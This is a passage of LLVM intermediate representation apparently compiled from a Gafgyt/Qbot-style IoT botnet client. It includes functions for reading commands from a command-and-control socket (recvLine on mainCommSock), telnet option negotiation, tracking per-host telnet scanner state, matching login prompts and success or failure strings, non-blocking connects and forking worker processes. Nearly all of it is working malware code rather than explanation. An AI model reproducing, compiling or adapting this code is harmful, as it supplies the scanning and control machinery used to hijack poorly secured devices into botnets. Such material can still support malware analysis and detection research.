  %42 = tail call i32 @wildString(i8* %40, i8* %41)
  %43 = icmp ne i32 %42, 0
  br label %44

; <label>:44:                                     ; preds = %39, %32
  %45 = phi i1 [ true, %32 ], [ %43, %39 ]
  %46 = zext i1 %45 to i32
  br label %47

; <label>:47:                                     ; preds = %44, %29, %18, %4
  %.0 = phi i32 [ %46, %44 ], [ %31, %29 ], [ %20, %18 ], [ %6, %4 ]
  ret i32 %.0
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #3
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define void @uppercase(i8* nocapture) local_unnamed_addr #1 {
  %2 = load i8, i8* %0, align 1
  %3 = icmp eq i8 %2, 0
  br i1 %3, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %4 = phi i8 [ %9, %.lr.ph ], [ %2, %.lr.ph.preheader ]
  %.04 = phi i8* [ %8, %.lr.ph ], [ %0, %.lr.ph.preheader ]
  %5 = zext i8 %4 to i32
  %6 = tail call i32 @toupper(i32 %5) #15
  %7 = trunc i32 %6 to i8
  store i8 %7, i8* %.04, align 1
  %8 = getelementptr inbounds i8, i8* %.04, i64 1
  %9 = load i8, i8* %8, align 1
  %10 = icmp eq i8 %9, 0
  br i1 %10, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getBogos(i8*) local_unnamed_addr #1 {
  %2 = alloca [4096 x i8], align 16
  %3 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i64 0, i64 0), i32 0) #3
  %4 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 0
  %5 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %6 = icmp eq i8* %5, null
  br i1 %6, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %1
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %24
  call void @uppercase(i8* nonnull %4)
  %strncmp = call i32 @strncmp(i8* nonnull %4, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  br i1 %cmp, label %7, label %24

; <label>:7:                                      ; preds = %.lr.ph
  %8 = getelementptr inbounds [4096 x i8], [4096 x i8]* %2, i64 0, i64 8
  br label %9

; <label>:9:                                      ; preds = %.critedge, %7
  %.0 = phi i8* [ %8, %7 ], [ %11, %.critedge ]
  %10 = load i8, i8* %.0, align 1
  switch i8 %10, label %.preheader.preheader [
    i8 32, label %.critedge
    i8 9, label %.critedge
    i8 58, label %.critedge
  ]

.preheader.preheader:                             ; preds = %9
  br label %.preheader

.critedge:                                        ; preds = %9, %9, %9
  %11 = getelementptr inbounds i8, i8* %.0, i64 1
  br label %9

.preheader:                                       ; preds = %.preheader.preheader, %16
  %12 = call i64 @strlen(i8* %.0) #15
  %13 = add i64 %12, -1
  %14 = getelementptr inbounds i8, i8* %.0, i64 %13
  %15 = load i8, i8* %14, align 1
  switch i8 %15, label %17 [
    i8 13, label %16
    i8 10, label %16
  ]

; <label>:16:                                     ; preds = %.preheader, %.preheader
  store i8 0, i8* %14, align 1
  br label %.preheader

; <label>:17:                                     ; preds = %.preheader
  %18 = call i8* @strchr(i8* nonnull %.0, i32 46) #15
  %19 = icmp eq i8* %18, null
  br i1 %19, label %21, label %20

; <label>:20:                                     ; preds = %17
  store i8 0, i8* %18, align 1
  br label %21

; <label>:21:                                     ; preds = %17, %20
  %22 = call i8* @strcpy(i8* %0, i8* nonnull %.0) #3
  %23 = call i32 @close(i32 %3) #3
  br label %28

; <label>:24:                                     ; preds = %.lr.ph
  call void @llvm.memset.p0i8.i64(i8* nonnull %4, i8 0, i64 4096, i32 16, i1 false)
  %25 = call i8* @fdgets(i8* nonnull %4, i32 4096, i32 %3)
  %26 = icmp eq i8* %25, null
  br i1 %26, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %24
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %1
  %27 = call i32 @close(i32 %3) #3
  br label %28

; <label>:28:                                     ; preds = %._crit_edge, %21
  %.017 = phi i32 [ 0, %21 ], [ 1, %._crit_edge ]
  ret i32 %.017
}

declare i32 @open(i8* nocapture readonly, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8* nocapture) local_unnamed_addr #2

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8* nocapture readonly) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @getCores() local_unnamed_addr #1 {
  %1 = alloca [4096 x i8], align 16
  %2 = tail call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.132, i64 0, i64 0), i32 0) #3
  %3 = getelementptr inbounds [4096 x i8], [4096 x i8]* %1, i64 0, i64 0
  %4 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %5 = icmp eq i8* %4, null
  br i1 %5, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %0
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %.04 = phi i32 [ %..0, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  call void @uppercase(i8* nonnull %3)
  %strncmp = call i32 @strncmp(i8* nonnull %3, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.133, i64 0, i64 0), i64 8)
  %cmp = icmp eq i32 %strncmp, 0
  %6 = zext i1 %cmp to i32
  %..0 = add nsw i32 %6, %.04
  call void @llvm.memset.p0i8.i64(i8* nonnull %3, i8 0, i64 4096, i32 16, i1 false)
  %7 = call i8* @fdgets(i8* nonnull %3, i32 4096, i32 %2)
  %8 = icmp eq i8* %7, null
  br i1 %8, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %0
  %.0.lcssa = phi i32 [ 0, %0 ], [ %..0, %._crit_edge.loopexit ]
  %9 = call i32 @close(i32 %2) #3
  ret i32 %.0.lcssa
}

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeRandomStr(i8* nocapture, i32) local_unnamed_addr #0 {
  %3 = icmp sgt i32 %1, 0
  br i1 %3, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %2
  %wide.trip.count = zext i32 %1 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ %indvars.iv.next, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %4 = tail call i32 @rand_cmwc()
  %5 = urem i32 %4, 26
  %6 = add nuw nsw i32 %5, 65
  %7 = trunc i32 %6 to i8
  %8 = getelementptr inbounds i8, i8* %0, i64 %indvars.iv
  store i8 %7, i8* %8, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %exitcond = icmp eq i64 %indvars.iv.next, %wide.trip.count
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %2
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8* nocapture, i32) local_unnamed_addr #1 {
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %5 to %struct.timeval*
  %6 = alloca i8, align 1
  %7 = sext i32 %2 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %1, i8 0, i64 %7, i32 1, i1 false)
  store <2 x i64> <i64 30, i64 0>, <2 x i64>* %5, align 16
  %8 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 0
  %9 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %8) #3, !srcloc !13
  %10 = srem i32 %0, 64
  %11 = zext i32 %10 to i64
  %12 = shl i64 1, %11
  %13 = sdiv i32 %0, 64
  %14 = sext i32 %13 to i64
  %15 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %4, i64 0, i32 0, i64 %14
  %16 = load i64, i64* %15, align 8
  %17 = or i64 %16, %12
  store i64 %17, i64* %15, align 8
  %18 = add nsw i32 %0, 1
  %19 = call i32 @select(i32 %18, %struct.__sigset_t* nonnull %4, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %4, %struct.timeval* nonnull %tmpcast) #3
  %20 = icmp sgt i32 %2, 1
  br i1 %20, label %.lr.ph.preheader, label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %29
  %.in = phi i32 [ %21, %29 ], [ %2, %.lr.ph.preheader ]
  %.024 = phi i32 [ %30, %29 ], [ 0, %.lr.ph.preheader ]
  %.01923 = phi i8* [ %27, %29 ], [ %1, %.lr.ph.preheader ]
  %21 = add nsw i32 %.in, -1
  %22 = load i32, i32* @mainCommSock, align 4
  %23 = call i64 @recv(i32 %22, i8* nonnull %6, i64 1, i32 0) #3
  %24 = icmp eq i64 %23, 1
  br i1 %24, label %25, label %._crit_edge.loopexit

; <label>:25:                                     ; preds = %.lr.ph
  %26 = load i8, i8* %6, align 1
  %27 = getelementptr inbounds i8, i8* %.01923, i64 1
  store i8 %26, i8* %.01923, align 1
  %28 = icmp eq i8 %26, 10
  br i1 %28, label %._crit_edge.loopexit, label %29

; <label>:29:                                     ; preds = %25
  %30 = add nuw nsw i32 %.024, 1
  %31 = icmp sgt i32 %21, 1
  br i1 %31, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %29, %25
  %.1.sink.ph = phi i8* [ %.01923, %.lr.ph ], [ %27, %29 ], [ %27, %25 ]
  %.020.ph = phi i32 [ -1, %.lr.ph ], [ %30, %29 ], [ %.024, %25 ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %3
  %.1.sink = phi i8* [ %1, %3 ], [ %.1.sink.ph, %._crit_edge.loopexit ]
  %.020 = phi i32 [ 0, %3 ], [ %.020.ph, %._crit_edge.loopexit ]
  store i8 0, i8* %.1.sink, align 1
  ret i32 %.020
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #4

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define i8* @get_telstate_host(%struct.telstate_t* nocapture readonly) local_unnamed_addr #1 {
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 1
  %3 = load i32, i32* %2, align 4
  %4 = tail call i8* @inet_ntoa(i32 %3) #3
  ret i8* %4
}

; Function Attrs: nounwind
declare i8* @inet_ntoa(i32) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @read_until_response(i32, i32, i8*, i32, i8** nocapture readonly) local_unnamed_addr #1 {
  %6 = sext i32 %3 to i64
  tail call void @llvm.memset.p0i8.i64(i8* %2, i8 0, i64 %6, i32 1, i1 false)
  %7 = tail call i32 @read_with_timeout(i32 %0, i32 %1, i8* %2, i32 %3)
  %8 = tail call i32 @contains_string(i8* %2, i8** %4)
  %not. = icmp ne i32 %8, 0
  %.0 = zext i1 %not. to i32
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @read_with_timeout(i32, i32, i8*, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.timeval, align 8
  %7 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 0
  store i64 0, i64* %7, align 8
  %8 = sext i32 %1 to i64
  %9 = getelementptr inbounds %struct.timeval, %struct.timeval* %6, i64 0, i32 1
  store i64 %8, i64* %9, align 8
  %10 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 0
  %11 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %10) #3, !srcloc !14
  %12 = srem i32 %0, 64
  %13 = zext i32 %12 to i64
  %14 = shl i64 1, %13
  %15 = sdiv i32 %0, 64
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %5, i64 0, i32 0, i64 %16
  %18 = load i64, i64* %17, align 8
  %19 = or i64 %18, %14
  store i64 %19, i64* %17, align 8
  %20 = add nsw i32 %0, 1
  %21 = call i32 @select(i32 %20, %struct.__sigset_t* nonnull %5, %struct.__sigset_t* null, %struct.__sigset_t* null, %struct.timeval* nonnull %6) #3
  %22 = icmp slt i32 %21, 1
  br i1 %22, label %27, label %23

; <label>:23:                                     ; preds = %4
  %24 = sext i32 %3 to i64
  %25 = call i64 @recv(i32 %0, i8* %2, i64 %24, i32 0) #3
  %26 = trunc i64 %25 to i32
  br label %27

; <label>:27:                                     ; preds = %4, %23
  %.0 = phi i32 [ %26, %23 ], [ 0, %4 ]
  ret i32 %.0
}

; Function Attrs: noinline nounwind uwtable
define i32 @negotiate(i32, i8*, i32) local_unnamed_addr #1 {
  %4 = alloca i8, align 1
  %5 = getelementptr inbounds i8, i8* %1, i64 1
  %6 = load i8, i8* %5, align 1
  %.off = add i8 %6, 5
  %switch = icmp ult i8 %.off, 4
  br i1 %switch, label %7, label %20

; <label>:7:                                      ; preds = %3
  store i8 -1, i8* %4, align 1
  %8 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %9 = load i8, i8* %5, align 1
  switch i8 %9, label %13 [
    i8 -4, label %10
    i8 -2, label %11
    i8 3, label %12
  ]

; <label>:10:                                     ; preds = %7
  store i8 -2, i8* %4, align 1
  br label %16

; <label>:11:                                     ; preds = %7
  store i8 -4, i8* %4, align 1
  br label %16

; <label>:12:                                     ; preds = %7
  store i8 -3, i8* %4, align 1
  br label %16

; <label>:13:                                     ; preds = %7
  %14 = icmp eq i8 %9, -3
  %15 = select i1 %14, i8 -4, i8 -2
  store i8 %15, i8* %4, align 1
  br label %16

; <label>:16:                                     ; preds = %11, %13, %12, %10
  %17 = call i64 @send(i32 %0, i8* nonnull %4, i64 1, i32 16384) #3
  %18 = getelementptr inbounds i8, i8* %1, i64 2
  %19 = call i64 @send(i32 %0, i8* %18, i64 1, i32 16384) #3
  br label %20

; <label>:20:                                     ; preds = %3, %16
  ret i32 0
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_string(i8*, i8** nocapture readonly) local_unnamed_addr #1 {
  br label %3

; <label>:3:                                      ; preds = %3, %2
  %indvars.iv13 = phi i64 [ %indvars.iv.next14, %3 ], [ 0, %2 ]
  %indvars.iv.next14 = add nuw nsw i64 %indvars.iv13, 1
  %4 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv.next14
  %5 = load i8*, i8** %4, align 8
  %6 = icmp eq i8* %5, null
  br i1 %6, label %.preheader, label %3

.preheader:                                       ; preds = %3
  %7 = trunc i64 %indvars.iv13 to i32
  %8 = icmp slt i32 %7, 0
  br i1 %8, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  %sext = shl i64 %indvars.iv13, 32
  %9 = ashr exact i64 %sext, 32
  br label %.lr.ph

; <label>:10:                                     ; preds = %.lr.ph
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %11 = icmp slt i64 %indvars.iv, %9
  br i1 %11, label %.lr.ph, label %._crit_edge.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %10
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %10 ]
  %12 = getelementptr inbounds i8*, i8** %1, i64 %indvars.iv
  %13 = load i8*, i8** %12, align 8
  %14 = tail call i32 (i8*, i8*, ...) bitcast (i32 (...)* @strcasestr to i32 (i8*, i8*, ...)*)(i8* %0, i8* %13) #3
  %15 = icmp eq i32 %14, 0
  br i1 %15, label %10, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph, %10
  %.09.ph = phi i32 [ 0, %10 ], [ 1, %.lr.ph ]
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.09 = phi i32 [ 0, %.preheader ], [ %.09.ph, %._crit_edge.loopexit ]
  ret i32 %.09
}

declare i32 @strcasestr(...) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @advance_state(%struct.telstate_t* nocapture, i32) local_unnamed_addr #1 {
  %3 = icmp eq i32 %1, 0
  br i1 %3, label %4, label %8

; <label>:4:                                      ; preds = %2
  %5 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 0
  %6 = load i32, i32* %5, align 8
  %7 = tail call i32 @close(i32 %6) #3
  br label %8

; <label>:8:                                      ; preds = %4, %2
  %9 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 7
  store i32 0, i32* %9, align 8
  %10 = trunc i32 %1 to i8
  %11 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 2
  store i8 %10, i8* %11, align 8
  %12 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 9
  %13 = load i8*, i8** %12, align 8
  tail call void @llvm.memset.p0i8.i64(i8* %13, i8 0, i64 1024, i32 1, i1 false)
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @reset_telstate(%struct.telstate_t* nocapture) local_unnamed_addr #1 {
  tail call void @advance_state(%struct.telstate_t* %0, i32 0)
  %2 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %0, i64 0, i32 3
  store i8 1, i8* %2, align 1
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_success(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([4 x i8*], [4 x i8*]* @successes, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_fail(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_string(i8* %0, i8** getelementptr inbounds ([8 x i8*], [8 x i8*]* @fails, i64 0, i64 0))
  ret i32 %2
}

; Function Attrs: noinline nounwind uwtable
define i32 @contains_response(i8*) local_unnamed_addr #1 {
  %2 = tail call i32 @contains_success(i8* %0)
  %3 = icmp eq i32 %2, 0
  br i1 %3, label %4, label %7

; <label>:4:                                      ; preds = %1
  %5 = tail call i32 @contains_fail(i8* %0)
  %6 = icmp ne i32 %5, 0
  br label %7

; <label>:7:                                      ; preds = %1, %4
  %8 = phi i1 [ true, %1 ], [ %6, %4 ]
  %9 = zext i1 %8 to i32
  ret i32 %9
}

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca %struct.timeval, align 8
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %11 = sext i32 %10 to i64
  %12 = or i64 %11, 2048
  %13 = tail call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %12) #3
  %14 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %14, align 4
  %15 = trunc i32 %2 to i16
  %16 = tail call zeroext i16 @htons(i16 zeroext %15) #18
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %16, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %19 = call i32 @getHost(i8* %1, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %58

; <label>:21:                                     ; preds = %4
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %25 = call i32 @connect(i32 %0, %struct.sockaddr* nonnull %24, i32 16) #3
  %26 = icmp slt i32 %25, 0
  br i1 %26, label %27, label %53

; <label>:27:                                     ; preds = %21
  %28 = tail call i32* @__errno_location() #18
  %29 = load i32, i32* %28, align 4
  %30 = icmp eq i32 %29, 115
  br i1 %30, label %31, label %58

; <label>:31:                                     ; preds = %27
  %32 = sext i32 %3 to i64
  %33 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 0
  store i64 %32, i64* %33, align 8
  %34 = getelementptr inbounds %struct.timeval, %struct.timeval* %7, i64 0, i32 1
  store i64 0, i64* %34, align 8
  %35 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 0
  %36 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* nonnull %35) #3, !srcloc !15
  %37 = srem i32 %0, 64
  %38 = zext i32 %37 to i64
  %39 = shl i64 1, %38
  %40 = sdiv i32 %0, 64
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds %struct.__sigset_t, %struct.__sigset_t* %6, i64 0, i32 0, i64 %41
  %43 = load i64, i64* %42, align 8
  %44 = or i64 %43, %39
  store i64 %44, i64* %42, align 8
  %45 = add nsw i32 %0, 1
  %46 = call i32 @select(i32 %45, %struct.__sigset_t* null, %struct.__sigset_t* nonnull %6, %struct.__sigset_t* null, %struct.timeval* nonnull %7) #3
  %47 = icmp sgt i32 %46, 0
  br i1 %47, label %48, label %58

; <label>:48:                                     ; preds = %31
  store i32 4, i32* %8, align 4
  %49 = bitcast i32* %9 to i8*
  %50 = call i32 @getsockopt(i32 %0, i32 1, i32 4, i8* nonnull %49, i32* nonnull %8) #3
  %51 = load i32, i32* %9, align 4
  %52 = icmp eq i32 %51, 0
  br i1 %52, label %53, label %58

; <label>:53:                                     ; preds = %48, %21
  %54 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 3, i8* null) #3
  %55 = sext i32 %54 to i64
  %56 = and i64 %55, -2049
  %57 = call i32 (i32, i32, ...) @fcntl(i32 %0, i32 4, i64 %56) #3
  br label %58

; <label>:58:                                     ; preds = %27, %31, %48, %4, %53
  %.0 = phi i32 [ 1, %53 ], [ 0, %4 ], [ 0, %48 ], [ 0, %31 ], [ 0, %27 ]
  ret i32 %.0
}

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #4

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #9

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #5

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() local_unnamed_addr #1 {
  %1 = tail call i32 @fork() #3
  %2 = icmp eq i32 %1, 0
  br i1 %2, label %21, label %3

; <label>:3:                                      ; preds = %0
  %4 = load i64, i64* @numpids, align 8
  %5 = add i64 %4, 1
  store i64 %5, i64* @numpids, align 8
  %6 = shl i64 %4, 2
  %7 = add i64 %6, 8
  %8 = tail call noalias i8* @malloc(i64 %7) #3
  %9 = bitcast i8* %8 to i32*
  %10 = icmp eq i64 %4, 0
  br i1 %10, label %.._crit_edge_crit_edge, label %.lr.ph.preheader

.._crit_edge_crit_edge:                           ; preds = %3
  %.pre14 = load i8*, i8** bitcast (i32** @pids to i8**), align 8
  br label %._crit_edge

.lr.ph.preheader:                                 ; preds = %3
  %.pre = load i32*, i32** @pids, align 8
  %11 = bitcast i32* %.pre to i8*
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %12 = phi i64 [ %17, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %.012 = phi i32 [ %16, %.lr.ph ], [ 0, %.lr.ph.preheader ]
  %13 = getelementptr inbounds i32, i32* %.pre, i64 %12
  %14 = load i32, i32* %13, align 4
  %15 = getelementptr inbounds i32, i32* %9, i64 %12
  store i32 %14, i32* %15, align 4
  %16 = add i32 %.012, 1
  %17 = zext i32 %16 to i64
  %18 = icmp ult i64 %17, %4
  br i1 %18, label %.lr.ph, label %._crit_edge.loopexit

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.._crit_edge_crit_edge
  %19 = phi i8* [ %.pre14, %.._crit_edge_crit_edge ], [ %11, %._crit_edge.loopexit ]
  %.lcssa = phi i64 [ 0, %.._crit_edge_crit_edge ], [ %4, %._crit_edge.loopexit ]
  %20 = getelementptr inbounds i32, i32* %9, i64 %.lcssa
  store i32 %1, i32* %20, align 4
  tail call void @free(i8* %19) #3
  store i8* %8, i8** bitcast (i32** @pids to i8**), align 8
  br label %21

; <label>:21:                                     ; preds = %0, %._crit_edge
  ret i32 %1
}

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #5

; Function Attrs: noinline nounwind readonly uwtable
define i32 @matchPrompt(i8* nocapture readonly) local_unnamed_addr #11 {
.preheader:
  %1 = tail call i64 @strlen(i8* %0) #15
  %2 = trunc i64 %1 to i32
  %sext = shl i64 %1, 32
  %3 = ashr exact i64 %sext, 32
  %4 = getelementptr inbounds i8, i8* %0, i64 %3
  %sext41 = shl i64 %1, 32
  %5 = ashr exact i64 %sext41, 32
  %6 = icmp sgt i32 %2, 0
  br i1 %6, label %.lr.ph.preheader, label %.critedge

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.preheader.137:                                   ; preds = %.critedge
  %7 = icmp sgt i32 %2, %.1.lcssa
  br i1 %7, label %.lr.ph.1.preheader, label %.critedge.1

.lr.ph.1.preheader:                               ; preds = %.preheader.137
  br label %.lr.ph.1

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.critedge1
  %indvars.iv = phi i64 [ %indvars.iv.next, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %.130 = phi i32 [ %12, %.critedge1 ], [ 0, %.lr.ph.preheader ]
  %8 = sub nsw i64 0, %indvars.iv
  %9 = getelementptr inbounds i8, i8* %4, i64 %8
  %10 = load i8, i8* %9, align 1
  %11 = trunc i64 %indvars.iv to i32
  switch i8 %10, label %.critedge.loopexit [
    i8 0, label %.critedge1
    i8 32, label %.critedge1
    i8 13, label %.critedge1
    i8 10, label %.critedge1
  ]

.critedge1:                                       ; preds = %.lr.ph, %.lr.ph, %.lr.ph, %.lr.ph
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %12 = add nsw i32 %.130, 1
  %13 = icmp sgt i64 %5, %indvars.iv.next
  br i1 %13, label %.lr.ph, label %.critedge.loopexit

.critedge.loopexit:                               ; preds = %.lr.ph, %.critedge1
  %.1.lcssa.ph = phi i32 [ %11, %.lr.ph ], [ %12, %.critedge1 ]
  br label %.critedge

.critedge:                                        ; preds = %.critedge.loopexit, %.preheader
  %.1.lcssa = phi i32 [ 0, %.preheader ], [ %.1.lcssa.ph, %.critedge.loopexit ]
  %14 = sext i32 %.1.lcssa to i64
  %15 = sub nsw i64 0, %14
  %16 = getelementptr inbounds i8, i8* %4, i64 %15
  %17 = load i8, i8* %16, align 1
  %18 = icmp eq i8 %17, 58
  br i1 %18, label %19, label %.preheader.137

; <label>:19:                                     ; preds = %.critedge.3, %.critedge.2, %.critedge.1, %.critedge
  ret i32 1

.lr.ph.1:                                         ; preds = %.lr.ph.1.preheader, %.critedge1.1
  %indvars.iv.1 = phi i64 [ %indvars.iv.next.1, %.critedge1.1 ], [ %14, %.lr.ph.1.preheader ]
  %.130.1 = phi i32 [ %24, %.critedge1.1 ], [ %.1.lcssa, %.lr.ph.1.preheader ]
  %20 = sub nsw i64 0, %indvars.iv.1
  %21 = getelementptr inbounds i8, i8* %4, i64 %20
  %22 = load i8, i8* %21, align 1
  %23 = trunc i64 %indvars.iv.1 to i32
  switch i8 %22, label %.critedge.1.loopexit [
    i8 0, label %.critedge1.1
    i8 32, label %.critedge1.1
    i8 13, label %.critedge1.1
    i8 10, label %.critedge1.1
  ]

.critedge1.1:                                     ; preds = %.lr.ph.1, %.lr.ph.1, %.lr.ph.1, %.lr.ph.1
  %indvars.iv.next.1 = add nsw i64 %indvars.iv.1, 1
  %24 = add nsw i32 %.130.1, 1
